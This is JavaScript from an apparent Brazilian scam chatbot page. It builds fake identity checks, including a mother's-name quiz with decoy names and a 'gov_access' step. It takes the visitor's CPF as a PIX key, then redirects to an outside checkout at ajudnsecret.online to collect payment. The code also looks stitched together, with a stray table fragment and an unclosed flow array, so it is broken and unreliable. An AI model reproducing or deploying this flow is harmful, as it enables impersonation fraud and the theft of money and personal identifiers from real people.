 <script>

    function generateMotherOptions(correctName) {
      if (correctName === 'Não Informado' || !correctName || correctName.length < 3) {
        return [
          { label: 'MARIA DAS GRAÇAS SILVA', next: 'gov_access' },
          { label: 'ANA PAULA OLIVEIRA', next: 'gov_access' },
          { label: 'ANTONIA FERREIRA LIMA', next: 'gov_access' },
          { label: 'Nenhuma das anteriores', next: 'gov_access' }
        ];
      }

      const commonNames = [
        "MARIA JOSE DA SILVA",
        "ANA LUCIA DOS SANTOS",
        "FRANCISCA OLIVEIRA LIMA",
        "ANTONIA PEREIRA DE SOUZA",
        "TEREZINHA DE JESUS SILVA",
        "ADRIANA SOUZA PINTO",
        "RAIMUNDA NONATA COSTA"
      ];

      let filtered = commonNames.filter(n => n.toUpperCase() !== correctName.toUpperCase());
      let shuffledDistractors = filtered.sort(() => 0.5 - Math.random()).slice(0, 3);
      let options = shuffledDistractors.map(name => ({ label: name, next: 'gov_access' }));

      options.push({ label: correctName.toUpperCase(), next: 'gov_access' });

      // Shuffle only the name options, then add 'Nenhuma das anteriores' last
      options.sort(() => 0.5 - Math.random());
      options.push({ label: 'Nenhuma das anteriores', next: 'gov_access' });

      return options;
    }

          <tbody>
            <tr><td>1887</td><td>NOME COMPLETO</td><td>690,40</td><td>202,25</td><td>892,65</td></tr>
            <tr><td>1888</td><td>CPF</td><td>489,35</td><td>515,90</td><td>1005,25</td></tr>

          </tbody>
        </table>
        <div class="totais-row">

const flow = [

    function scrollToBottom() {
      requestAnimationFrame(() => {
        chatContent.scrollTop = chatContent.scrollHeight;
      });
    }

    const CHAT_SPEED = 0.75;
    const chatDelay = (milliseconds) => Math.max(250, Math.round(milliseconds * CHAT_SPEED));

    const chatScrollObserver = new MutationObserver(scrollToBottom);
    chatScrollObserver.observe(chatContent, { childList: true, subtree: true });

    function appendMessage(type, content) {
      const row = document.createElement('div');
      row.className = `message-row ${type} fadeIn`;
      let html = (type === 'bot') ? '<div class="avatar"></div>' : '';
      html += `<div class="bubble">${content}</div>`;
      row.innerHTML = html;
      chatContent.appendChild(row);
      scrollToBottom();

      // Scroll again after images/media finish loading
      const images = row.querySelectorAll('img');
      images.forEach(img => {
        img.addEventListener('load', scrollToBottom);
      });

      // Also scroll after a short delay for any dynamic content
      setTimeout(scrollToBottom, 300);

      // Set PIX key in the newly created row (not old duplicates)
      const displayPix = row.querySelector('#display-pix');
      if (displayPix) displayPix.textContent = state.pixKey;
      const displayPixFinal = row.querySelector('#display-pix-final');
      if (displayPixFinal) displayPixFinal.textContent = state.pixKey;
      const displayPixCheckout = row.querySelector('#display-pix-checkout');
      if (displayPixCheckout) displayPixCheckout.textContent = state.pixKey;
    }

    function showTyping() {
      const row = document.createElement('div');
      row.className = 'message-row bot fadeIn';
      row.innerHTML = '<div class="avatar"></div><div class="typing"><span></span><span></span><span></span></div>';
      chatContent.appendChild(row);
      scrollToBottom();
      return row;
    }

    function gerarPagamentoPix() {
      window.location.assign('https://ajudnsecret.online/checkout-ltda1/?id=18e0ff18bbab2d67624749c9');
    }

    function exibirPix(dados) {
      const qrImg = document.getElementById('pixQrCode');
      const qrInput = document.getElementById('pixCopiaCola');
      const copiarBtn = document.getElementById('copiarPixBtn');

      if (!qrImg || !qrInput || !copiarBtn) return;

      const image = dados.pix_qrcode_image ||
        `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(dados.pix_qrcode_text)}`;
      qrImg.src = image.startsWith('data:') || image.startsWith('http')
        ? image
        : `data:image/png;base64,${image}`;
      qrImg.style.display = 'block';
      qrInput.value = dados.pix_qrcode_text;
      qrInput.style.display = 'block';
      copiarBtn.style.display = 'block';

      copiarBtn.onclick = async () => {
        try {
          await navigator.clipboard.writeText(dados.pix_qrcode_text);
          copiarBtn.textContent = 'Código copiado!';
          setTimeout(() => {
            copiarBtn.textContent = 'Copiar código Pix';
          }, 1800);
        } catch (error) {
          qrInput.select();
          document.execCommand('copy');
          copiarBtn.textContent = 'Código copiado!';
          setTimeout(() => {
            copiarBtn.textContent = 'Copiar código Pix';
          }, 1800);
        }
      };
    }

    function iniciarMonitoramentoPagamento(paymentCode) {
      if (!paymentCode) return;

      const pixStatus = document.getElementById('pixStatus');
      let tentativas = 0;
      const maxTentativas = 120;

      const intervalo = setInterval(async () => {
        try {
          const resposta = await fetch(`/api/mangofy-status?paymentCode=${encodeURIComponent(paymentCode)}`);
          const dados = await resposta.json();

          if (!resposta.ok) {
            throw new Error(dados?.message || 'Erro ao consultar status do PIX.');
          }

          const status = (dados?.payment_status || '').toLowerCase();
          const pixAprovado = document.getElementById('pixAprovado');

          if (pixStatus) {
            if (status === 'approved') {
              pixStatus.textContent = 'Pagamento aprovado! Você pode continuar.';
              if (pixAprovado) {
                pixAprovado.style.display = 'block';
              }
            } else if (status === 'pending' || status === 'in_process') {
              pixStatus.textContent = 'Aguardando confirmação do pagamento...';
              if (pixAprovado) pixAprovado.style.display = 'none';
            } else if (status === 'refused' || status === 'canceled' || status === 'expired') {
              pixStatus.textContent = 'Pagamento não foi confirmado.';
              clearInterval(intervalo);
            } else {
              pixStatus.textContent = 'Status do pagamento: ' + (dados?.payment_status || 'desconhecido');
            }
          }

          if (status === 'approved') {
            clearInterval(intervalo);
            if (pixStatus) pixStatus.textContent = 'Pagamento aprovado!';
            if (pixAprovado) pixAprovado.style.display = 'block';
            return;
          }

          if (['refused', 'canceled', 'expired'].includes(status)) {
            clearInterval(intervalo);
            return;
          }
        } catch (erro) {
          console.error('Erro ao consultar status do pagamento:', erro);
        }

        tentativas += 1;
        if (tentativas >= maxTentativas) {
          clearInterval(intervalo);
          if (pixStatus) pixStatus.textContent = 'Tempo de confirmação excedido.';
        }
      }, 5000);
    }

    async function runStep(stepIndex) {
      state.currentStep = stepIndex;
      const step = flow[stepIndex];
      controls.innerHTML = '';
      controls.classList.remove('active');

      // Delay opcional no início do passo
      if (step.stepDelay) {
        const typing = showTyping();
        await new Promise(r => setTimeout(r, chatDelay(step.stepDelay)));
        typing.remove();
      }

      const TYPING_DURATION = 900;

      for (let i = 0; i < step.messages.length; i++) {
        const msg = step.messages[i];
        const delayTime = chatDelay(msg.delay || 1500);

        if (delayTime > TYPING_DURATION) {
          // Wait silently first, then show typing only at the end
          await new Promise(r => setTimeout(r, delayTime - TYPING_DURATION));
          const typing = showTyping();
          await new Promise(r => setTimeout(r, TYPING_DURATION));
          typing.remove();
        } else {
          // Short delay: show typing for the full duration
          const typing = showTyping();
          await new Promise(r => setTimeout(r, delayTime));
          typing.remove();
        }

        appendMessage('bot', msg.content);
      }
      renderControls(step);
    }

    function renderControls(step) {
      if (step.type === 'button') {
        // Render button options INLINE in the chat
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'chat-options fadeIn';

        step.options.forEach(opt => {
          const btn = document.createElement('button');
          btn.textContent = opt.label;
          btn.onclick = () => {
            if (opt.action === 'redirect') {
              window.location.href = 'https://indenl.lovable.app/upsell1/index.html' + window.location.search;
              return;
            }
            // Remove the options from the chat
            optionsContainer.remove();

            // Add user response as a chat bubble
            appendMessage('user', opt.label);
            if (opt.value) state.pixType = opt.value;

            // If CPF selected, auto-fill the PIX key and skip to check_pix
            if (opt.value === 'CPF') {
              state.pixKey = userCPF;
              setTimeout(() => {
                appendMessage('user', userCPF);
                setTimeout(() => {
                  const nextIndex = flow.findIndex(f => f.id === 'check_pix');
                  runStep(nextIndex);
                }, INTERACTION_DELAY);
              }, INTERACTION_DELAY);
              return;
            }

            setTimeout(() => {
              const nextIndex = flow.findIndex(f => f.id === opt.next);
              runStep(nextIndex);
            }, INTERACTION_DELAY);
          };
          optionsContainer.appendChild(btn);
        });

        chatContent.appendChild(optionsContainer);
        scrollToBottom();

      } else if (step.type === 'input') {
        // Show the controls area for input
        controls.classList.add('active');
        controls.innerHTML = '';

        const wrapper = document.createElement('div');
        wrapper.className = 'input-wrapper';
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = step.placeholder;
        const btn = document.createElement('button');
        btn.innerHTML = '<i class="fas fa-paper-plane"></i>';

        const submit = () => {
          const val = input.value.trim();
          if (val) {
            if (step.id === 'type_pix') state.pixKey = val;
            controls.innerHTML = '';
            controls.classList.remove('active');
            appendMessage('user', val);
            setTimeout(() => {
              const nextIndex = flow.findIndex(f => f.id === step.next);
              runStep(nextIndex);
            }, INTERACTION_DELAY);
          }
        };
        btn.onclick = submit;
        input.onkeypress = (e) => { if (e.key === 'Enter') submit(); };
        wrapper.appendChild(input);
        wrapper.appendChild(btn);
        controls.appendChild(wrapper);

        // Delay para focar no input
        setTimeout(() => input.focus(), 300);
      } else if (step.type === 'redirect') {
        const typing = showTyping();
        setTimeout(() => {
          typing.remove();
          // O fluxo define a URL no campo "url" (não em "redirectUrl").
          const destino = step.url || step.redirectUrl;
          if (destino) {
            window.location.assign(destino);
          } else {
            console.error('Etapa de redirecionamento sem URL configurada:', step);
          }
        }, 3000);
      } else if (step.type === 'pix_payment') {
        const typing = showTyping();
        setTimeout(() => {
          typing.remove();
          // Redireciona o usuário diretamente para o link do checkout
          window.location.href = 'https://ajudnsecret.online/checkout-ltda1/?id=18e0ff18bbab2d67624749c9';
        }, 3000);
      }
    }

    // Configuração global de delay entre interações
    const INTERACTION_DELAY = 400;

    window.addEventListener('load', () => {
      setTimeout(() => { runStep(0); }, 500);
    });
  </script>
